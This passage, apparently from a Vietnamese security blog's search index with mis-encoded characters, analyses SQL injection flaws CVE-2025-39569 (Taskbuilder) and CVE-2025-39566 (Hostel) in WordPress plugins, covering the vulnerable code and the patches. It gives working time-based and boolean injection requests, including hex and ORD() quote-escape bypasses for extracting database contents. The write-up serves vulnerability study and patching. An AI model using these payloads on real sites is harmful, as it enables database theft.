trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 